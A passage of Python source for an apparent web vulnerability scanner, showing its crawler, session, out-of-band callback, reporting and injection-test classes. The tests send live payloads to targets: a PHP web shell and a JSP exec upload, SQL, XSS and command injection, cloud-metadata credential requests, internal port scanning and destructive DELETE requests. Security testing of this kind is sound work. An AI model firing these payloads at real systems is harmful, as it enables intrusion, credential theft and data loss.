                if self._is_in_scope(abs_url): links.add(abs_url)
        js_pattern = re.findall(r'''(?:href=|location\.href=|window\.open\(['"]|fetch\(['"]|src=|action=|url:['"])([^'")\s]+)''', html, re.I)
        for m in js_pattern:
            m = m.strip('"\'')
            if m:
                abs_url = urljoin(base_url, m)
                if self._is_in_scope(abs_url): links.add(abs_url)
        return list(links)
    
    def _extract_parameters(self, url: str, html: str, soup: Any) -> None:
        parsed = urlparse(url)
        for param in parse_qs(parsed.query):
            self._add_param(url, 'GET', param, 'query')
        for form in soup.find_all('form'):
            method = form.get('method', 'get').upper()
            action = urljoin(url, form.get('action', '')) or url
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name:
                    self._add_param(action, method, name, 'post')
            if form.get('enctype') == 'application/json':
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        self._add_param(action, 'POST', name, 'json')
        json_keys = re.findall(r'''['"](\w+)['"]\s*:\s*['"]?\{.*?\}['"]?''', html)
        for key in json_keys:
            self._add_param(url, 'POST', key, 'json')

    def _add_param(self, url: str, method: str, param: str, ptype: str) -> None:
        key = (url, method, param)
        if not any(p['url']==url and p['method']==method and p['param']==param for p in self.parameters):
            self.parameters.append({'url':url,'method':method,'param':param,'type':ptype})

# ---------------------------------------------------------------------
# SESSION MANAGER
# ---------------------------------------------------------------------
class SessionManager:
    """Manages HTTP sessions, authentication, and cookies"""

    def __init__(self, config: Dict[str, Any], loop: asyncio.AbstractEventLoop, circuit_breaker: CircuitBreaker) -> None:
        self.config = config
        self.loop = loop
        self.circuit_breaker = circuit_breaker
        self.async_session: Optional[AsyncSession] = None
        self.secondary_session: Optional[AsyncSession] = None
        self.rate_limiter = AsyncRateLimiter(config.get('delay', DEFAULT_DELAY))
        self.proxy_rotator = ProxyRotator(config.get('proxy_list'))

    async def setup(self) -> None:
        self.async_session = AsyncSession(loop=self.loop)

    async def close(self) -> None:
        if self.async_session:
            await self.async_session.close()

    async def fetch(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, allow_redirects: bool = False) -> Optional[Any]:
        await self.rate_limiter.wait()

        if not self.circuit_breaker.allow_request():
            logging.warning(f"Circuit breaker is open, skipping request to {url}")
            return None
        
        kwargs = {'allow_redirects': allow_redirects}
        if headers: kwargs['headers'] = headers
        if data: kwargs['data'] = data
        if json_data: kwargs['json'] = json_data
        proxy = self.proxy_rotator.get_next_proxy()
        if proxy:
            kwargs['proxy'] = proxy
        
        for attempt in range(self.circuit_breaker.max_retries):
            try:
                resp = await self.async_session.request(method, url, **kwargs)
                self.circuit_breaker.record_success()
                return resp
            except Exception as e:
                logging.warning(f"Fetch error {url} (attempt {attempt + 1}/{self.circuit_breaker.max_retries}): {e}")
                if attempt < self.circuit_breaker.max_retries - 1:
                    backoff_delay = self.circuit_breaker.get_backoff_delay(attempt)
                    logging.info(f"Retrying in {backoff_delay}s...")
                    await asyncio.sleep(backoff_delay)
                else:
                    self.circuit_breaker.record_failure()
                    if proxy:
                        self.proxy_rotator.mark_failed(proxy)
        return None
    
    async def perform_authentication(self, auth_steps: List[Dict[str, Any]]) -> Optional[Dict[str, str]]:
        """Perform authentication steps using async aiohttp"""
        for step in auth_steps:
            url = step.get('url')
            method = step.get('method', 'GET')
            data = step.get('data')
            json_data = step.get('json')
            headers = step.get('headers', {})
            try:
                resp = await self.fetch(url, method=method, data=data, json_data=json_data, headers=headers)
                if resp and resp.status == 200:
                    logging.info(f"Authentication step succeeded: {method} {url}")
                else:
                    logging.warning(f"Authentication step failed: {method} {url} - Status: {resp.status if resp else 'No response'}")
            except Exception as e:
                logging.warning(f"Authentication error: {e}")
    
    def load_cookies(self, cookies):
        """Load cookies into async session"""
        if self.async_session:
            for cookie in cookies:
                self.async_session.session.cookie_jar.update_cookies(cookie)

# ---------------------------------------------------------------------
# OOB MANAGER
# ---------------------------------------------------------------------
class OOBManager:
    """Manages OOB (Out-of-Band) servers for callback detection"""

    def __init__(self, config: Dict[str, Any], public_ip: str) -> None:
        self.config = config
        self.public_ip = public_ip
        self.oob_server: Optional[Any] = None
        self.oob_port: Optional[int] = None
        self.oob_dns_ip = config.get('oob_dns_ip')
        self.oob_dns_domain = config.get('oob_dns_domain', 'oob.example.com')
        self.oob_marker_base = uuid.uuid4().hex[:8]
        self.enable_advanced_oob = config.get('enable_advanced_oob', False)
        self.smtp_oob_handler: Optional[Any] = None
        self.icmp_oob_listener: Optional[Any] = None
        self.https_oob_server: Optional[Any] = None
        self.https_oob_port: Optional[int] = None

    async def setup(self) -> None:
        """Start all OOB servers"""
        self.oob_server, self.oob_port = start_oob_server()
        logging.info(f"OOB HTTP: {self.public_ip}:{self.oob_port}")

        if self.enable_advanced_oob:
            self.smtp_oob_handler = SMTPOOBHandler()
            if self.smtp_oob_handler.start():
                logging.info("SMTP OOB server started on port 2525")

            self.icmp_oob_listener = ICMPOOBListener()
            if self.icmp_oob_listener.start():
                logging.info("ICMP OOB listener started")

            self.https_oob_server, self.https_oob_port = start_https_oob_server()
            if self.https_oob_server:
                logging.info(f"OOB HTTPS: {self.public_ip}:{self.https_oob_port}")

    def stop(self) -> None:
        """Stop all OOB servers"""
        if self.oob_server:
            try:
                self.oob_server.shutdown()
                PortAllocator.release_port(self.oob_port)
                logging.info(f"OOB HTTP server stopped (port {self.oob_port})")
            except Exception as e:
                logging.warning(f"Error stopping OOB HTTP server: {e}")
        
        if self.enable_advanced_oob:
            if self.smtp_oob_handler:
                try:
                    self.smtp_oob_handler.stop()
                    logging.info("SMTP OOB server stopped")
                except Exception as e:
                    logging.warning(f"Error stopping SMTP OOB server: {e}")
            
            if self.icmp_oob_listener:
                try:
                    self.icmp_oob_listener.stop()
                    logging.info("ICMP OOB listener stopped")
                except Exception as e:
                    logging.warning(f"Error stopping ICMP OOB listener: {e}")
            
            if self.https_oob_server:
                try:
                    self.https_oob_server.shutdown()
                    PortAllocator.release_port(self.https_oob_port)
                    logging.info(f"OOB HTTPS server stopped (port {self.https_oob_port})")
                except Exception as e:
                    logging.warning(f"Error stopping OOB HTTPS server: {e}")

# ---------------------------------------------------------------------
# REPORTING ENGINE
# ---------------------------------------------------------------------
class ReportingEngine:
    """Handles vulnerability reporting, CVSS scoring, and export formats"""
    
    def __init__(self, config, signals, session_manager=None):
        self.config = config
        self.signals = signals
        self.vulnerabilities = []
        self.fp_db = FP_Database()
        self.session_manager = session_manager  # Reuse connection pool for outbound requests
    
    def log(self, msg):
        """Log message - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'log'):
            self.signals.log.emit(msg)
        else:
            logging.info(msg)
    
    def add_finding(self, vuln):
        """Report vulnerability finding - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'finding'):
            self.signals.finding.emit(vuln)
        else:
            logging.info(f"Finding: {vuln}")
    
    def update_progress(self, current, total):
        """Update progress - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'progress'):
            self.signals.progress.emit(current, total)
        else:
            logging.info(f"Progress: {current}/{total}")
    
    def calculate_cvss(self, vuln):
        if not CVSS_AVAILABLE:
            return None
        try:
            vector = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
            c = CVSS4(vector)
            return c.score
        except Exception as e:
            logging.warning(f"CVSS calculation error: {e}")
            return None
    
    def export_burp_xml(self, report):
        xml = '<?xml version="1.0"?>\n<issues>\n'
        for vuln in report['vulnerabilities']:
            xml += f"""<issue>
    <serialNumber>{vuln.get('id','')}</serialNumber>
    <type>{vuln['type']}</type>
    <name>{vuln['type']}</name>
    <host ip="unknown">{urlparse(vuln['url']).hostname}</host>
    <path>{urlparse(vuln['url']).path}</path>
    <location>{vuln['url']}</location>
    <severity>{vuln['severity']}</severity>
    <confidence>{vuln['confidence']}</confidence>
    <issueDetail>{vuln.get('evidence','')}</issueDetail>
</issue>\n"""
        xml += '</issues>'
        return xml
    
    async def send_jira_alert(self, vuln):
        jira_url = self.config.get('jira_webhook')
        if jira_url:
            try:
                if self.session_manager and self.session_manager.async_session:
                    # Reuse existing connection pool
                    async with self.session_manager.async_session.session.request('POST', jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)}) as resp:
                        if resp.status == 200:
                            self.log(f"JIRA alert sent for {vuln['type']}")
                else:
                    # Fallback to new session
                    async with aiohttp.ClientSession() as session:
                        await session.post(jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)})
                        self.log(f"JIRA alert sent for {vuln['type']}")
            except Exception as e:
                self.log(f"Failed to send JIRA alert: {e}")
    
    async def send_slack_alert(self, vuln):
        slack_url = self.config.get('slack_webhook')
        if slack_url:
            try:
                if self.session_manager and self.session_manager.async_session:
                    # Reuse existing connection pool
                    async with self.session_manager.async_session.session.request('POST', slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"}) as resp:
                        if resp.status == 200:
                            self.log(f"Slack alert sent for {vuln['type']}")
                else:
                    # Fallback to new session
                    async with aiohttp.ClientSession() as session:
                        await session.post(slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"})
                        self.log(f"Slack alert sent for {vuln['type']}")
            except Exception as e:
                self.log(f"Failed to send Slack alert: {e}")
    
    def close(self):
        if self.fp_db:
            try:
                self.fp_db.close()
            except Exception as e:
                logging.warning(f"Error closing FP database: {e}")

# ---------------------------------------------------------------------
# INJECTION ENGINE
# ---------------------------------------------------------------------
class InjectionEngine:
    """Handles all injection-based vulnerability tests (SQLi, XSS, etc.)"""
    
    def __init__(self, config, crawler_engine, session_manager, reporting_engine, oob_manager):
        self.config = config
        self.crawler_engine = crawler_engine
        self.session_manager = session_manager
        self.reporting_engine = reporting_engine
        self.oob_manager = oob_manager
        self.baseline_cache = BaselineCache()
        self.token_normalizer = TokenNormalizer()
        self.selenium_driver = None
        self.selenium_ready = False
        
        # Initialize missing attributes for async operations
        self.stop_event = asyncio.Event()
        self.concurrency_limit = config.get('concurrency_limit', 100)
        self.semaphore = asyncio.Semaphore(self.concurrency_limit)
        self.current_task = 0
        self.total_tasks = 0
        self.loop = asyncio.get_event_loop()
        
        # OOB-related attributes
        self.enable_advanced_oob = config.get('enable_advanced_oob', False)
        self.https_oob_port = None
        self.oob_dns_ip = config.get('oob_dns_ip')
        self.oob_dns_domain = config.get('oob_dns_domain', 'oob.example.com')
        self.oob_marker_base = getattr(oob_manager, 'oob_marker_base', uuid.uuid4().hex[:8])
        self.public_ip = getattr(oob_manager, 'public_ip', '127.0.0.1')
        self.oob_port = getattr(oob_manager, 'oob_port', 8080)
        
        # Scan state manager for second-order tests
        self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
    
    async def run_tests(self):
        """Run all injection tests"""
        await self.run_active_tests()
        await self.run_idor_tests()
        await self.test_org_user_id_mismatch()
        await self.test_role_hierarchy_escalation()
        await self.test_array_bulk_idor()
        await self.run_mass_assignment_tests()
        await self.run_csrf_checks()
        await self.run_cors_checks()
        await self.run_http_method_tests()

    # --- Helper methods ---
    def log(self, msg):
        """Log message"""
        logging.info(msg)

    def update_progress(self, current, total):
        """Update progress"""
        logging.info(f"Progress: {current}/{total}")

    async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None):
        """Async HTTP fetch with session management"""
        if not self.session_manager or not self.session_manager.async_session:
            return None
        try:
            async with self.session_manager.async_session.session.request(
                method, url, data=data, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                body = await resp.text()
                # Store response metadata for detection
                resp._body = body
                resp._elapsed = getattr(resp, '_elapsed', 0)
                return resp
        except Exception as e:
            logging.debug(f"Async fetch error for {url}: {e}")
            return None

    async def _add_vulnerability(self, vuln):
        """Add vulnerability through reporting engine"""
        if self.reporting_engine:
            await self.reporting_engine._add_vulnerability(vuln)
        else:
            logging.info(f"Finding: {vuln}")

    # --- HTTP Method Tests ---
    async def run_http_method_tests(self):
        """Comprehensive HTTP method vulnerability testing"""
        self.log("Starting HTTP method vulnerability tests...")
        
        # Test URLs from crawled pages
        test_urls = list(self.crawler_engine.visited_urls)[:20]  # Limit to first 20 URLs for efficiency
        
        for url in test_urls:
            if self.stop_event.is_set():
                break
                
            # Test each HTTP method
            await self._test_put_method(url)
            await self._test_patch_method(url)
            await self._test_post_method(url)
            await self._test_get_method(url)
            await self._test_delete_method(url)
            await self._test_options_method(url)
            
            self.current_task += 1
            self.update_progress(self.current_task, self.total_tasks)

    async def _test_put_method(self, url):
        """Test PUT method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test file upload payload
            file_payloads = [
                '<?php system($_GET["cmd"]); ?>',
                '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'DB_PASSWORD=secret123',
                'test_file_upload.txt',
            ]
            
            for payload in file_payloads:
                if self.stop_event.is_set():
                    break
                    
                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
                test_payload = f"{marker}_{payload}"
                
                resp = await self._async_fetch(url, method='PUT', data=test_payload)
                if resp:
                    result = Detector.put_file_upload(resp, baseline_resp, url, test_payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                    
                    result = Detector.put_resource_overwrite(resp, baseline_resp, url)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                    
                    # Check OOB callbacks
                    await asyncio.sleep(0.3)
                    with oob_results_lock:
                        for res in oob_results:
                            if marker in res['path']:
                                await self._add_vulnerability({
                                    "type": "PUT OOB Callback",
                                    "confidence": 95,
                                    "evidence": f"OOB callback: {res['path']}",
                                    "url": url,
                                    "severity": "High"
                                })
                                break
        except Exception as e:
            logging.warning(f"PUT method test error for {url}: {e}")

    async def _test_patch_method(self, url):
        """Test PATCH method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test mass assignment payloads
            mass_assignment_payloads = [
                '{"is_admin": true, "role": "administrator"}',
                '{"permissions": ["all", "admin", "superuser"]}',
                '{"access_level": 99, "is_superuser": true}',
            ]
            
            for payload in mass_assignment_payloads:
                if self.stop_event.is_set():
                    break
                    
                try:
                    json_data = json.loads(payload)
                except json.JSONDecodeError:
                    json_data = None
                    resp = await self._async_fetch(url, method='PATCH', data=payload)
                else:
                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
                
                if resp:
                    result = Detector.patch_mass_assignment(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
            
            # Test validation bypass payloads
            validation_payloads = [
                '{"email": "invalid-email-no-at-sign"}',
                '{"age": -999, "quantity": 999999}',
                '{"username": "admin\' OR 1=1--"}',
            ]
            
            for payload in validation_payloads:
                if self.stop_event.is_set():
                    break
                    
                try:
                    json_data = json.loads(payload)
                except json.JSONDecodeError:
                    json_data = None
                    resp = await self._async_fetch(url, method='PATCH', data=payload)
                else:
                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
                    
                if resp:
                    result = Detector.patch_validation_bypass(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                        
        except Exception as e:
            logging.warning(f"PATCH method test error for {url}: {e}")

    async def _test_post_method(self, url):
        """Test POST method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test stored XSS payloads
            xss_payloads = [
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
            ]
            
            for payload in xss_payloads:
                if self.stop_event.is_set():
                    break
                    
                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
                oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
                test_payload = payload.replace('alert(1)', f'fetch("{oob_url}")')
                
                resp = await self._async_fetch(url, method='POST', data={'test': test_payload})
                if resp:
                    result = Detector.post_stored_xss(resp, baseline_resp, test_payload, oob_results, marker)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
            
            # Test authentication bypass
            auth_payloads = [
                {'username': '', 'password': ''},
                {'username': 'admin', 'password': ''},
                {'user': 'admin', 'pass': 'any'},
            ]
            
            for payload in auth_payloads:
                if self.stop_event.is_set():
                    break
                    
                resp = await self._async_fetch(url, method='POST', data=payload)
                if resp:
                    result = Detector.post_auth_bypass(resp, baseline_resp, url)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": str(payload)})
            
            # Test command injection
            cmd_payloads = [
                ';id',
                '|whoami',
                '&&dir',
                '||ping -c 1 127.0.0.1',
            ]
            
            for payload in cmd_payloads:
                if self.stop_event.is_set():
                    break
                    
                resp = await self._async_fetch(url, method='POST', data={'cmd': payload})
                if resp:
                    result = Detector.post_command_injection(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                        
        except Exception as e:
            logging.warning(f"POST method test error for {url}: {e}")

    async def _test_get_method(self, url):
        """Test GET method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test IDOR by manipulating IDs in URL
            id_pattern = re.search(r'/(\d+)', url)
            if id_pattern:
                original_id = id_pattern.group(1)
                test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), '99999']
                
                for test_id in test_ids:
                    if self.stop_event.is_set():
                        break
                        
                    test_url = url.replace(f'/{original_id}', f'/{test_id}')
                    resp = await self._async_fetch(test_url, method='GET')
                    if resp:
                        result = Detector.get_idor(resp, baseline_resp, test_url, test_id)
                        if result:
                            await self._add_vulnerability({**result, "url": test_url})
            
            # Test parameter pollution
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                polluted_params = []
                for key, values in params.items():
                    polluted_params.append((key, values[0]))
                    polluted_params.append((key, 'polluted_value'))
                
                polluted_url = urlunparse(parsed._replace(query=urlencode(polluted_params, doseq=True)))
                resp = await self._async_fetch(polluted_url, method='GET')
                if resp:
                    result = Detector.get_parameter_pollution(resp, baseline_resp, polluted_url)
                    if result:
                        await self._add_vulnerability({**result, "url": polluted_url})
            
            # Test cache poisoning potential
            result = Detector.get_cache_poisoning(baseline_resp, None, url)
            if result:
                await self._add_vulnerability({**result, "url": url})
                
        except Exception as e:
            logging.warning(f"GET method test error for {url}: {e}")

    async def _test_delete_method(self, url):
        """Test DELETE method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test unauthorized deletion
            resp = await self._async_fetch(url, method='DELETE')
            if resp:
                result = Detector.delete_unauthorized(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
            
            # Test DELETE IDOR
            id_pattern = re.search(r'/(\d+)', url)
            if id_pattern:
                original_id = id_pattern.group(1)
                test_id = str(int(original_id) + 1)
                test_url = url.replace(f'/{original_id}', f'/{test_id}')
                
                resp = await self._async_fetch(test_url, method='DELETE')
                if resp:
                    result = Detector.delete_idor(resp, baseline_resp, test_url, test_id)
                    if result:
                        await self._add_vulnerability({**result, "url": test_url})
            
            # Test cascading deletion
            if resp:
                result = Detector.delete_cascading(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
                    
        except Exception as e:
            logging.warning(f"DELETE method test error for {url}: {e}")

    async def _test_options_method(self, url):
        """Test OPTIONS method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            if not baseline_resp:
                return
            
            # Test OPTIONS method
            resp = await self._async_fetch(url, method='OPTIONS')
            if resp:
                result = Detector.options_info_disclosure(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
                
        except Exception as e:
            logging.warning(f"OPTIONS method test error for {url}: {e}")

    # --- Active tests ---
    async def run_active_tests(self):
        self.log(f"Active tests on {len(self.crawler_engine.parameters)} parameters")
        # Populate baselines first
        await self._populate_baselines()
        tasks = []
        for i, param in enumerate(self.crawler_engine.parameters):
            tasks.append(asyncio.ensure_future(self._test_param(param)))
            # Update progress periodically
            if i % 10 == 0:
                self.current_task += 1
                self.update_progress(self.current_task, self.total_tasks)
        # Use asyncio.wait with timeout to prevent hanging if target hangs
        done, pending = await asyncio.wait(tasks, timeout=300, return_when=asyncio.ALL_COMPLETED)
        if pending:
            for task in pending:
                task.cancel()
            logging.warning(f"{len(pending)} active test tasks timed out and were cancelled")
        await self.second_order_injection_tests()
        await self.race_condition_tests()
        await self.request_smuggling_tests()
        await self.http2_downgrade_tests()

    async def _populate_baselines(self):
        async def baseline_for(param):
            key = (param['url'], param['method'], param['param'])
            if await self.baseline_cache.get(key):
                return
            url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
            safe = "1"
            start_time = time.perf_counter()
            if method == 'GET':
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[pname] = [safe]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                resp = await self._async_fetch(test_url)
            else:
                if ptype == 'json':
                    resp = await self._async_fetch(url, method='POST', json_data={pname: safe})
                else:
                    resp = await self._async_fetch(url, method='POST', data={pname: safe})
            elapsed = time.perf_counter() - start_time
            if resp:
                await self.baseline_cache.set(key, {
                    'text': self.token_normalizer.normalize(resp._body),
                    'headers': dict(resp.headers),
                    'status': resp.status,
                    'elapsed': elapsed
                })
        tasks = [baseline_for(p) for p in self.crawler_engine.parameters]
        # Use asyncio.wait with timeout to prevent hanging if target hangs
        done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
        if pending:
            for task in pending:
                task.cancel()
            logging.warning(f"{len(pending)} baseline tasks timed out and were cancelled")

    async def _test_param(self, param):
        async with self.semaphore:  # Limit concurrent requests
            for vuln_type, payloads in PAYLOADS.items():
                if isinstance(payloads, dict) or vuln_type in ("RequestSmuggling", "JWT", "Cloud", "RaceCondition"):
                    continue
                for payload in payloads:
                    for variant in obfuscate(payload):
                        if self.stop_event.is_set(): return
                        await self._send_and_detect(param, vuln_type, variant)

    async def _test_imdsv2_ssrf(self, target_url):
        """Test for IMDSv2 SSRF using two-step token retrieval"""
        try:
            # Step 1: PUT request to get token
            token_headers = {
                "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
            token_resp = await self._async_fetch(
                "http://169.254.169.254/latest/api/token",
                method='PUT',
                headers=token_headers
            )
            if token_resp and token_resp.status == 200:
                token = token_resp._body.strip()
                # Step 2: Use token to access metadata
                metadata_headers = {
                    "X-aws-ec2-metadata-token": token
                }
                metadata_resp = await self._async_fetch(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    headers=metadata_headers
                )
                if metadata_resp and metadata_resp.status == 200:
                    await self._add_vulnerability({
                        "type":"SSRF (IMDSv2)","url":target_url,"parameter":"*",
                        "evidence":"IMDSv2 token retrieval successful - metadata accessible",
                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SSRF"]
                    })
        except Exception as e:
            logging.warning(f"IMDSv2 test error: {e}")

    async def _test_ssrf_internal_port_scan(self, url):
        """Test for SSRF by scanning internal ports and inferring open ports from response differences"""
        if not self.crawler_engine.parameters:
            return
        
        # Common internal ports to scan
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
        base_domain = urlparse(url).netloc
        
        for param in self.crawler_engine.parameters[:5]:  # Limit to first 5 parameters to avoid excessive requests
            param_name = param['param']
            param_url = param['url']
            
            # Get baseline response
            baseline_resp = await self._async_fetch(param_url)
            if not baseline_resp:
                continue
            
            baseline_status = baseline_resp.status
            baseline_time = getattr(baseline_resp, '_elapsed', 0)
            
            for port in common_ports:
                # Test SSRF to internal port
                ssrf_payload = f"http://127.0.0.1:{port}"
                
                start_time = time.time()
                test_resp = await self._send_injection(param, ssrf_payload)
                elapsed = time.time() - start_time
                
                if test_resp:
                    # Check for response differences
                    status_diff = test_resp.status != baseline_status
                    time_diff = abs(elapsed - baseline_time) > 1.0  # 1 second difference
                    
                    # Check for port-specific responses
                    body_lower = test_resp._body.lower()
                    port_indicators = {
                        22: ['ssh', 'protocol'],
                        80: ['http', 'html'],
                        443: ['https', 'ssl'],
                        3306: ['mysql', 'database'],
                        5432: ['postgresql', 'postgres'],
                        6379: ['redis'],
                        8080: ['tomcat', 'jetty'],
                        9200: ['elasticsearch'],
                        27017: ['mongodb', 'mongo']
                    }
                    
                    port_detected = any(indicator in body_lower for indicator in port_indicators.get(port, []))
                    
                    if status_diff or time_diff or port_detected:
                        evidence = []
                        if status_diff:
                            evidence.append(f"status change: {baseline_status}->{test_resp.status}")
                        if time_diff:
                            evidence.append(f"time diff: {elapsed - baseline_time:.2f}s")
                        if port_detected:
                            evidence.append(f"port {port} indicators found")
                        
                        await self._add_vulnerability({
                            "type":"SSRF (Internal Port Scan)","url":param_url,"parameter":param_name,
                            "evidence":f"Port {port} appears open: {', '.join(evidence)}",
                            "severity":"High","confidence":80,"cwe":CWE_MAP["SSRF"]
                        })
                        break  # Stop after first detected port for this parameter

    async def _send_and_detect(self, param, vuln_type, payload):
        param_key = (param['url'], param['method'], param['param'])
        baseline = await self.baseline_cache.get(param_key)
        baseline_html = baseline['text'] if baseline else None
        baseline_time = baseline['elapsed'] if baseline else None

        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']

        marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
        oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
        oob_dns = f"{marker}.{self.oob_dns_domain}"
        payload = payload.replace(OOB_MARKER, oob_url).replace(OOB_DNS, oob_dns)

        js_driver = self.selenium_driver if self.selenium_ready else None

        # IMDSv2 two-step token retrieval test
        if vuln_type == "SSRF" and "169.254.169.254" in payload:
            await self._test_imdsv2_ssrf(url)

        # Union SQLi detection
        if vuln_type == "SQLi" and "ORDER BY" in payload:
            results = []
            last_test_html = ''
            for order_num in range(1, 20):
                p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
                resp_test = await self._send_injection(param, p)
                resp_baseline = await self._send_injection(param, "1")
                if resp_test and resp_baseline:
                    diff = abs(len(resp_test._body) - len(resp_baseline._body))
                    results.append((order_num, diff))
                    last_test_html = resp_test._body
            union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
            union_result = Detector.sqli_union(last_test_html, results, union_marker)
            if union_result:
                resp = await self._send_injection(param, union_result['payload'])
                if resp and union_marker in resp._body:
                    await self._add_vulnerability({
                        "type":"SQLi (Union)","url":url,"parameter":pname,"method":method,
                        "evidence":f"Union injection confirmed with marker {union_marker}",
                        "severity":"High","confidence":90,"cwe":CWE_MAP["SQLi"]
                    })
            return

        # Time-based SQLi (using elapsed time approximation with aiohttp)
        if vuln_type == "SQLi" and "SLEEP" in payload.upper():
            # We'll measure response time by wrapping the request with time.perf_counter_ns()
            start = time.perf_counter_ns()
            resp = await self._send_injection(param, payload)
            elapsed = (time.perf_counter_ns() - start) / 1_000_000_000  # Convert nanoseconds to seconds
            if resp and baseline_time:
                if elapsed > baseline_time * 1.5:
                    result = {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {elapsed:.1f}s vs baseline {baseline_time:.1f}s"}
                    await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["SQLi"]})
            await asyncio.sleep(0.5)
            return

        resp = await self._send_injection(param, payload)
        if not resp: return
        html = self.token_normalizer.normalize(resp._body)
        result = None

        if vuln_type == "XSS":
            result = Detector.xss(html, payload, baseline_html)
            if not result and OOB_MARKER in payload:
                await asyncio.sleep(0.5)
                result = Detector.blind_xss(oob_results, marker)
            if not result and js_driver:
                dom_result = Detector.dom_xss(url, js_driver, marker, oob_url)
                if dom_result:
                    await self._add_vulnerability({**dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
        elif vuln_type == "SQLi":
            result = Detector.sqli(html, baseline_html)
            if not result:
                # Baseline shotgun SQLi detection
                legit_p = payload if not any(x in payload.upper() for x in ['AND', 'OR', 'UNION', 'SELECT']) else "1"
                resp_legit = await self._send_injection(param, legit_p)
                false_p = f"{payload} AND 1=2" if 'AND' not in payload.upper() else payload.replace("1=1", "1=2")
                true_p = f"{payload} AND 1=1" if 'AND' not in payload.upper() else payload.replace("1=2", "1=1")
                resp_false = await self._send_injection(param, false_p)
                resp_true = await self._send_injection(param, true_p)
                if resp_legit and resp_false and resp_true:
                    result = Detector.baseline_shotgun_sqli(resp_legit, resp_false, resp_true)
            if not result:
                true_p = payload.replace("1=1","1=1") if "1=1" in payload else f"{payload} AND 1=1"
                false_p = payload.replace("1=1","1=2") if "1=1" in payload else f"{payload} AND 1=2"
                resp_t = await self._send_injection(param, true_p)
                resp_f = await self._send_injection(param, false_p)
                if resp_t and resp_f:
                    result = Detector.sqli_boolean(resp_t, resp_f)
            if not result and self.oob_dns_ip and "LOAD_FILE" in payload:
                if await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
                    result = {"type":"SQLi (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
        elif vuln_type == "PathTraversal":
            result = Detector.path_traversal(html, baseline_html)
        elif vuln_type == "CommandInjection":
            result = Detector.command_injection(html, baseline_html)
            if not result and ("ping" in payload or "nslookup" in payload or "curl" in payload or "wget" in payload):
                if self.oob_dns_ip and await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
                    result = {"type":"CommandInjection (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
                else:
